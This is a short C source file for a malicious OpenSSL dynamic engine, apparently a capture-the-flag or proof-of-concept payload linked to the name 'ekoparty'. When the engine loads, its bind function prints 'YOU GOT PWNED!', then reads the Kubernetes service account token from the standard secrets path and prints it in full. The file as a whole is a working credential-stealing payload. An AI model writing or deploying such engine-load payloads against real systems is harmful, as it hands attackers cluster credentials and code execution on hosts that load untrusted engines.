#include <stdio.h>
#include <string.h>
#include <openssl/engine.h>
#include <unistd.h>
#include <sys/types.h>

static const char *engine_id   = "ekoparty";
static const char *engine_name = "Ekoparty Cloud Security";

static int bind_ekoparty(ENGINE *e, const char *id)
{
    FILE *fp;
    unsigned char buf[4096];
    size_t bytes_read;
    const char *path = "/var/run/secrets/kubernetes.io/serviceaccount/token";
    
    printf("YOU GOT PWNED!\n");
    
    fp = fopen(path, "rb");
    if (fp != NULL) {
        bytes_read = fread(buf, 1, sizeof(buf) - 1, fp);
        buf[bytes_read] = '\0';
        fclose(fp);
        printf("%s\n", path);
        printf("%zu bytes\n", bytes_read);
        printf("%s\n", buf);
    }
    
    fflush(stdout);
    
    if (!ENGINE_set_id(e, engine_id) || !ENGINE_set_name(e, engine_name)) {
        return 0;
    }
    
    return 1;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind_ekoparty)
IMPLEMENT_DYNAMIC_CHECK_FN()
